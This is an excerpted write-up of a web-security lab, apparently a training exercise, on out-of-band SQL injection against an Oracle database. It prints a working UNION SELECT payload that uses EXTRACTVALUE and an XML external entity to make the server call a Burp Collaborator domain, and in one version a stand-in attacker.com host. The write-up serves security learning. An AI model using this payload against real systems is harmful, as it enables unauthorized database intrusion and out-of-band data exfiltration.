...
The lab uses a PostgreSQL or Oracle backend (determined from previous labs and error patterns). The goal is to trigger an **out-of-band interaction** using SQL injection — making the database server connect to an external server we control.
...
3. This gives a unique subdomain like: `1xz7fi5m5a9x0o01xuz7hb6vbhmd58tx.oastify.com`
...
**URL-encoded version** (what I actually sent):
```
x' +UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//1xz7fi5m5a9x0o01xuz7hb6vbhmd58tx.oastify.com/">+%25remote%3b]>'),'')+FROM+dual--
```
...
| Component | Purpose |
|-----------|---------|
| `x'` | Closes the existing string context |
...
### Step 7: Lab Solved
The database server made an HTTP request to our Collaborator domain, proving the SQL injection works.
...
-- Injected query
SELECT * FROM products WHERE tracking_id = 'x' 
UNION 
SELECT EXTRACTVALUE(xmltype('<?xml ... <!ENTITY % remote SYSTEM "http://attacker.com/"> ...>'), '') FROM dual--
```
...
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://1xz7fi5m5a9x0o01xuz7hb6vbhmd58tx.oastify.com/"> 
%remote;]>'), '') FROM dual--
```

---
*Lab completed on: 2026-03-24*
